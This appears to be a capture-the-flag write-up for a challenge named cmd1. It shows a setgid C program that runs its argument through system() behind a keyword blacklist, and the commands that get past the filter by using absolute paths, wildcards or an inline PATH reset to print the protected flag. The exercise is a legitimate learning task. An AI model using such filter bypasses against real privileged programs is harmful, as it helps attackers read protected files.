# cmd1

The home folder of this challenge contains the following:

```
cmd1@ubuntu:~$ ls -l
total 20
-r-xr-sr-x 1 root cmd1_pwn 8513 Jul 14  2015 cmd1
-rw-r--r-- 1 root root      319 Jul 14  2015 cmd1.c
-r--r----- 1 root cmd1_pwn   48 Jul 14  2015 flag

```

### cmd1.c
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/fuckyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```

In this challenge, the `PATH` variable will be overrriden by a non-existing path. Therefore it is not possible to execute default programs like `cat` directly.

We could find out ourselves where the `cat` program is located on the system and execute it by typing the whole path.

```
cmd1@ubuntu:~$ which cat
/bin/cat
```

The words `flag`, `sh` and `tmp` are blacklisted and cannot be in the command we want to execute. The easiest solution to work aroud this is to execute `cat` for all the files in home folder.

```
cmd1@ubuntu:~$ ./cmd1 "/bin/cat *"
ELF>�@@X@8	@@@@@@��88@8@@@ ((`( PP`P`��TT@T@DDP�td��@�@44Q�tdR�td((`(`��/lib64/ld-linux-x86-64.so.2GNUGNU�{#'�(�/B�-��xl�
                  n(/! __gmon_start__libc.so.6strstrputenvsystem__libc_start_mainGLIBC_2.2.5ui
[truncated]
	system( argv[1] );
	return 0;
}

mommy now I get what PATH environment is for :)
```

It was also possible to set the `PATH` environment variable back to the original value.

```
cmd1@ubuntu:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
cmd1@ubuntu:~$ ./cmd1 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games; cat *"
[truncated]
mommy now I get what PATH environment is for :)
```
